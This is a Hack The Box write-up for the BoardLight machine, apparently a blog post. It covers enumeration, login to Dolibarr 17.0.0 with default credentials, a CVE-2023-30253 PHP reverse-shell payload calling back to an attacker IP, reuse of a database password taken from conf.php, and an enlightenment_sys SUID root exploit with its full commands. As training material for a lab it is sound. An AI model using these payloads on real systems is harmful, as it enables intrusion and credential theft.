---
clayout: ctf
title: BoardLight
date: 2025-06-18
image: /ctf/hack-the-box/machines/board-light/info-card.png
type: Hack The Box

ctf:
    - name: BoardLight
      link: https://app.hackthebox.com/machines/603
      thumbnail: /ctf/hack-the-box/machines/board-light/info-card.png
      pwned:
        - link: https://www.hackthebox.com/achievement/machine/585215/603
          thumbnail: /ctf/hack-the-box/machines/board-light/pwned.png
---

## Enumeration

### Nmap Scan

We start by running an Nmap scan to identify open ports and associated services on the target host:

```bash
nmap -sC -sV -A -oN nmap.txt 10.10.11.11
```

**Results:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 062d3b851059ff7366277f0eae03eaf4 (RSA)
|   256 5903dc52873a359934447433783135fb (ECDSA)
|_  256 ab1338e43ee024b46938a9638238ddf4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

**Identified Services:**

* **SSH (Port 22):** OpenSSH 8.2p1
* **HTTP (Port 80):** Apache 2.4.41

## Web Enumeration

Accessing `http://10.10.11.11` presents a welcome page.

![Welcome Page](/ctf/hack-the-box/machines/board-light/welcome.png)

In the footer, the contact email `info@board.htb` is displayed, indicating the likely virtual host. We add it to our `/etc/hosts` file:

```bash
echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

## Subdomain Enumeration

Using Gobuster, we enumerate virtual hosts:

```bash
gobuster vhost \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u "http://board.htb" \
  -t 20 \
  --append-domain
```

**Discovery:**

```bash
Found: crm.board.htb Status: 200 [Size: 6360]
```

We can add the discovered subdomain to `/etc/hosts`:

```bash
echo "10.10.11.11 crm.board.htb" | sudo tee -a /etc/hosts
```

Navigating to `http://crm.board.htb` reveals a login portal.

![Dolibarr Login](/ctf/hack-the-box/machines/board-light/login.png)

Using the default credentials `admin:admin`, we are able to login to the dashboard.

![Dolibarr Dashboard](/ctf/hack-the-box/machines/board-light/dashboard.png)

The dashboard identifies the service as **Dolibarr v17.0.0**.

## Vulnerability Identification

A known vulnerability, **CVE-2023-30253**, affects Dolibarr 17.0.0. Details are available in [this advisory](https://www.swascan.com/security-advisory-dolibarr-17-0-0/).

## Exploitation

Following the CVE-2023-30253 advisory:

1. We create a new website within Dolibarr.
2. We add a malicious PHP payload to a new page:

```php
<?PHP system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'"); ?>
```

Accessing the page triggers a reverse shell as the `www-data` user:

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Exploring the `/etc/passwd` file reveals a user named `larissa`. The file `conf.php` in `/var/www/html/crm.board.htb/htdocs/conf/` contains database credentials:

```php
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```

Using the password to attempt SSH access as `larissa` is successful:

```bash
ssh larissa@board.htb
larissa@boardlight:~$ id
uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
```

The user flag is located at `/home/larissa/user.txt`.

## Privilege Escalation

Searching for SUID binaries:

```bash
find / -type f -perm -u=s 2>/dev/null
```

**Target Identified:**

* `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys`

We use the existing exploit ([Exploit-DB #51180](https://www.exploit-db.com/exploits/51180)) to gain root access:

```bash
mkdir -p net
mkdir -p /dev/../tmp/;\ /tmp/exploit
echo '/bin/sh' > /tmp/exploit
chmod +x /tmp/exploit
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys \
  /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

The root flag is located at `/root/root.txt`.
